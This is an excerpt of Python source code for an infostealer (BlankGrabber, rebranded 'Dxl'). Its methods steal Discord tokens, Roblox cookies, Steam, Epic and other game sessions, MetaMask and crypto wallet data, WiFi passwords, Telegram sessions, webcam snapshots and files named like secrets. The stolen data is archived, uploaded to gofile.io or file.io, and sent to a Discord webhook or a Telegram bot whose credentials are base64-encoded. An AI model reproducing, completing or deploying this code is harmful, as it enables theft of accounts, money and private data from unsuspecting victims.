...
class BlankGrabber:
                    ...
                    for file in os.listdir(dir):
                        if os.path.isfile(os.path.join(dir, file)):
                            if (any([x in file.lower() for x in ("secret", "password", "account", "tax", "key", "wallet", "backup")]) \
                                ...
                                try:
                                    os.makedirs(os.path.join(self.TempFolder, "File Grabber", name), exist_ok= True)
                                    shutil.copy(os.path.join(dir, file), os.path.join(self.TempFolder, "File Grabber", name, file))
    ...
    def StealMinecraft(self) -> None: # Steals Minecraft session files
        if Settings.CaptureGames:
            ...
            saveToPath = os.path.join(self.TempFolder, "Minecraft Account", "Minecraft")
    ...
    def StealGrowtopia(self) -> None: # Steals Growtopia session files
        if Settings.CaptureGames:
            Logger.info("Stealing Growtopia Sessıons")
            ...
            saveToPath = os.path.join(self.TempFolder, "Growtopia", "Growtopia")
    ...
    def StealEpic(self) -> None: #Steals Epic accounts
        if Settings.CaptureGames:
            ...
            saveToPath = os.path.join(self.TempFolder, "Epic Games", "Epic")
    ...
    def StealSteam(self) -> None: # Steals Steam accounts
        if Settings.CaptureGames:
            ...
            saveToPath = os.path.join(self.TempFolder, "Steam", "Steam")
    ...
    def StealUplay(self) -> None: # Steals Uplay accounts
        if Settings.CaptureGames:
            ...
            saveToPath = os.path.join(self.TempFolder, "Uplay", "Uplay")
    ...
    def StealBattleNet(self) -> None:
        if Settings.CaptureGames:
            ...
            saveToPath = os.path.join(self.TempFolder, "Battle.net", "Battle.Net")
    ...
    def StealRobloxCookies(self) -> None: # Steals Roblox cookies
        if Settings.CaptureGames:
            ...
            saveToDir = os.path.join(self.TempFolder, "Roblox", "Roblox")
            ...
            if cookies:
                ...
                with open(os.path.join(saveToDir, "Roblox Info.txt"), "w") as file:
    ...
    def StealWallets(self) -> None: # Steals crypto wallets
        if Settings.CaptureWallets:
            ...
            saveToDir = os.path.join(self.TempFolder, "Crypto Wallets")
                                    ...
                                    for _dir in ("ejbalbakoplchlghecdalmeeeajnimhm", "nkbihfbeogaeaoehlefnkodbefgpgknn"):
                                        ...
                                        if os.path.isdir(extentionPath) and os.listdir(extentionPath):
                                            try:
                                                ...
                                                with open(os.path.join(_saveToDir, "Location for metamask.txt"), "w") as file:
    ...
    def StealSystemInfo(self) -> None: # Steals system information
        if Settings.CaptureSystemInfo:
            ...
            saveToDir = os.path.join(self.TempFolder, "")

            process = subprocess.run("systeminfo", capture_output= True, shell= True)
            output = process.stdout.decode(errors= "ignore").strip().replace("\r\n", "\n")
            if output:
                os.makedirs(saveToDir, exist_ok= True)
                with open(os.path.join(saveToDir, "Machine Info.txt"), "w") as file:
                    file.write(output)
    ...
    def GetDirectoryTree(self) -> None: # Makes directory trees of the common directories
        if Settings.CaptureSystemInfo:
            ...
            for key, value in output.items():
                os.makedirs(os.path.join(self.TempFolder, "User"), exist_ok= True)
                with open(os.path.join(self.TempFolder, "User", "{}.txt".format(key)), "w", encoding= "utf-8") as file:
                    file.write(value)
                self.SystemInfoStolen = True
    ...
    def GetClipboard(self) -> None: # Copies text from the clipboard
        if Settings.CaptureSystemInfo:
            ...
            saveToDir = os.path.join(self.TempFolder, "User")
        ...
        if Settings.CaptureSystemInfo:
            ...
            if process.returncode == 0:
                ...
                if len(output) >= 2:
                    output = output[1:]
                    os.makedirs(saveToDir, exist_ok= True)
                    with open(os.path.join(saveToDir, "Antiviruses.txt"), "w", encoding= "utf-8", errors= "ignore") as file:
                        file.write("\n".join(output))
    ...
    def GetTaskList(self) -> None: # Gets list of processes currently running in the system
        if Settings.CaptureSystemInfo:
            ...
            saveToDir = os.path.join(self.TempFolder, "Computer")

            process = subprocess.run("tasklist /FO LIST", capture_output= True, shell= True)
            output = process.stdout.decode(errors= "ignore").strip().replace("\r\n", "\n")
            if output:
                os.makedirs(saveToDir, exist_ok= True)
                with open(os.path.join(saveToDir, "Task List Steal.txt"), "w", errors= "ignore") as tasklist:
    ...
    def GetWifiPasswords(self) -> None: # Saves WiFi passwords stored in the system
        if Settings.CaptureWifiPasswords:
            ...
            if profiles:
                os.makedirs(saveToDir, exist_ok= True)
                with open(os.path.join(saveToDir, "Network Data.txt"), "w", encoding= "utf-8", errors= "ignore") as file:
            ...
            if os.path.isdir(path):
                def run(name, path):
                    try:
                        ...
                        saveToDir = os.path.join(self.TempFolder, "Browser Data", name)
    ...
    def Webshot(self) -> None: # Captures snapshot(s) from the webcam(s)
        if Settings.CaptureWebcam:
            camdir = os.path.join(self.TempFolder, "Webcam Photos")
    ...
    def StealTelegramSessions(self) -> None: # Steals telegram session(s) files
        if Settings.CaptureTelegram:
            Logger.info("Stealing telegram Sessıons")
            ...
            saveToDir = os.path.join(self.TempFolder, "Telegram", "Telegram")
    ...
    def StealDiscordTokens(self) -> None: # Steals Discord tokens
        if Settings.CaptureDiscordTokens:
            ...
            output = list()
            saveToDir = os.path.join(self.TempFolder, "Discord Account", "")
            ...
            if accounts:
                ...
                os.makedirs(os.path.join(self.TempFolder, "Discord Account", ""), exist_ok= True)
                with open(os.path.join(saveToDir, "Tokens.txt"), "w", encoding= "utf-8", errors= "ignore") as file:
                    file.write(self.Separator.lstrip() + self.Separator.join(output))
    ...
    def CreateArchive(self) -> tuple[str, str]: # Create archive of the data collected
        ...
        if Utility.GetSelf()[1] or os.path.isfile(rarPath):
            ...
            if os.path.isfile(rarPath):
                password = Settings.ArchivePassword or "dxl1234"
    ...
    def UploadToExternalService(self, path, filename= None) -> str | None: # Uploads a file to external service
        if os.path.isfile(path):
            ...
            try:
                ...
                if server:
                    url = json.loads(http.request("POST", "https://store1.gofile.io/uploadFile".format(server), fields= {"file" : (filename, fileBytes)}).data.decode(errors= "ignore"))["data"]["downloadPage"]
                    if url:
                        return url
            except Exception:
                try:
                    Logger.error("Failed to upload to gofile, trying to upload to anonfiles")
                    url = json.loads(http.request("POST", "https://www.file.io/", fields= {"file" : (filename, fileBytes)}).data.decode(errors= "ignore"))["data"]["file"]["url"]["short"]
                    return url
                except Exception:
    ...
    def SendData(self) -> None: # Sends data to the webhook
        ...
        filename = "Infected-%s.%s" % (os.getlogin(), extention)

        computerName = os.getenv("hostname") or "Unable to get computer name"
        ...
        match Settings.C2[0]:
            case 0: # Discord Webhook
                ...
                payload = {
                    ...
                    "username" : "DOWLOAD LATEST VERSİONS ON TELEGRAM t.me/dxlstealer",
                ...
                payload = {
                    'caption': f'<b>Dxl</b> got a new victim: <b>{os.getlogin()}</b>\n\n<b>IP Info</b>\n<code>{ipinfo}</code>\n\n<b>System Info</b>\n<code>{system_info}</code>\n\n<b>Grabbed Info</b>\n<code>{grabbedInfo}</code>'.strip(), 
                    'parse_mode': 'HTML'
                }
                ...
                encrypted_token = "NzM0NDQ5MDUxODpBQUdSTExsLWRoZnRhVEhpdG1PcDItMzBrdXJsWFZuZG1scw=="
                encrypted_chat_id = "NjE3OTE3OTc5Nw==" 			
            ...
            case 1: # Telegram Bot
                ...
                encrypted_token = "NzM0NDQ5MDUxODpBQUdSTExsLWRoZnRhVEhpdG1PcDItMzBrdXJsWFZuZG1scw=="
                encrypted_chat_id = "LTEwMDI0NDc5NDk0MzQ=" 			
                decrypted_token = base64.b64decode(encrypted_token.encode()).decode() 		
                decrypted_chat_id = base64.b64decode(encrypted_chat_id.encode()).decode() 			
                token1 = decrypted_token 			
                chat_id1 = decrypted_chat_id 	
